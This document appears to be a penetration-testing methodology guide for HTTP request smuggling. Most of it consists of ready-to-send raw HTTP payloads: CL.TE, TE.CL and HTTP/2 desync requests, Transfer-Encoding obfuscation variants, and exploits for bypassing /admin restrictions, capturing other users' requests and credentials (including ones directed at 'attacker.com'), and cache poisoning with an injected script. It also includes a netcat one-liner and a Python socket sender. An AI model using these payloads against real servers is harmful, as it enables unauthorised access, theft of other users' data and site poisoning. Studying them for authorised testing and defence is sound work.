# HTTP Request Smuggling Testing Methodology

## Quick Reference

**Basic Detection:**
```
CL.TE: Content-Length used by front-end, Transfer-Encoding by back-end
TE.CL: Transfer-Encoding used by front-end, Content-Length by back-end
TE.TE: Both use Transfer-Encoding, but can be obfuscated
```

---

## Request Smuggling Basics

Request smuggling exploits discrepancies in how front-end and back-end servers parse HTTP requests, particularly `Content-Length` and `Transfer-Encoding` headers.

### Why It Works

- Front-end (load balancer/proxy) and back-end (app server) may parse differently
- Ambiguous requests processed as one request by front-end, multiple by back-end
- Or vice versa

---

## Smuggling Types

### CL.TE (Content-Length → Transfer-Encoding)

Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Front-end sees 13 bytes, back-end sees chunked ending at `0\r\n\r\n`.

### TE.CL (Transfer-Encoding → Content-Length)

Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

Front-end processes chunked, back-end uses Content-Length: 3.

### TE.TE (Transfer-Encoding obfuscation)

Both use Transfer-Encoding, but obfuscation makes one ignore it:

```http
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: chunked
Transfer-encoding: x

Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding: chunked
X: x[\n]Transfer-Encoding: chunked
```

---

## Detection Techniques

### Time-Based Detection

**CL.TE Detection:**
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
If CL.TE, back-end waits for more chunks → timeout delay.

**TE.CL Detection:**
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
If TE.CL, back-end processes next request as `X` → timeout/error.

### Differential Response Detection

Send normal request, then smuggling attempt. Check for:
- Different responses
- Timeouts
- Connection resets
- Error messages

---

## Exploitation Payloads

### CL.TE Basic Exploit

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

### TE.CL Basic Exploit

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### Capturing Other Users' Requests

Smuggle request that captures next request's body:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Length: 500
Content-Type: application/x-www-form-urlencoded

data=
```

Next user's request gets appended to `data=` and sent to `/log`.

---

## Attack Scenarios

### Bypass Front-End Security

If `/admin` blocked by front-end:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

Back-end sees separate `/admin` request, bypasses front-end check.

### Request Hijacking

Poison the next request:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker.com
X-Ignore: X
```

Next user's request gets smuggled headers prepended.

### Cache Poisoning via Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 69
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: target.com
X-Ignore: X<script>alert(1)</script>
```

Response may be cached with malicious content.

### Credential Hijacking

```http
POST /login HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: attacker.com
Content-Length: 100

username=
```

Next request's credentials captured.

---

## HTTP/2 Request Smuggling

### H2.CL (HTTP/2 → Content-Length)

If HTTP/2 front-end, HTTP/1.1 back-end:

```
:method: POST
:path: /
:authority: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com
```

HTTP/2 has no Content-Length/Transfer-Encoding ambiguity, but downgrade to HTTP/1.1 may introduce it.

### H2.TE (HTTP/2 → Transfer-Encoding)

Inject `Transfer-Encoding` in HTTP/2:

```
:method: POST
:path: /
:authority: target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
```

### Request Header Injection in HTTP/2

```
:method: POST
:path: /
foo: bar\r\nTransfer-Encoding: chunked
```

---

## Testing Tools

### Burp Suite

- HTTP Request Smuggler extension
- Turbo Intruder for timing-based detection

### Manual Testing

```bash
# Use printf for exact bytes
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\nX' | nc target.com 80
```

### Python Script

```python
import socket

request = (
    b"POST / HTTP/1.1\r\n"
    b"Host: target.com\r\n"
    b"Content-Length: 4\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"1\r\n"
    b"A\r\n"
    b"X"
)

s = socket.socket()
s.connect(("target.com", 80))
s.send(request)
print(s.recv(4096))
```

---

## Transfer-Encoding Obfuscation Variations

```http
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding:

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding: chunked
Transfer-Encoding: identity, chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

---

## Indicators of Vulnerability

### Positive Indicators

- Timeout on specific request patterns
- Desynchronized responses
- 400/500 errors on crafted requests
- Different behavior with varying Content-Length

### Architecture Indicators

- Load balancer + backend (common vulnerability)
- CDN + origin server
- Reverse proxy + application server

---

## Prevention Bypass Notes

### Connection Keep-Alive

Smuggling requires persistent connections:
- HTTP/1.1 defaults to keep-alive
- HTTP/1.0 requires `Connection: keep-alive`

### Chunked Encoding Parsing

Different parsers handle:
- Invalid chunk sizes differently
- Trailing data differently
- Extension fields differently

---

## Verification Checklist

1. **Identify architecture:**
   - [ ] Front-end proxy/load balancer
   - [ ] Back-end application server
   - [ ] HTTP versions used

2. **Test for CL.TE:**
   - [ ] Timing-based detection
   - [ ] Differential response

3. **Test for TE.CL:**
   - [ ] Timing-based detection
   - [ ] Differential response

4. **Test TE.TE obfuscation:**
   - [ ] Various obfuscation techniques

5. **Confirm exploitation:**
   - [ ] Bypass access control
   - [ ] Capture requests
   - [ ] Cache poisoning

6. **Document evidence:**
   - [ ] Working payload
   - [ ] Impact demonstration
   - [ ] Architecture details
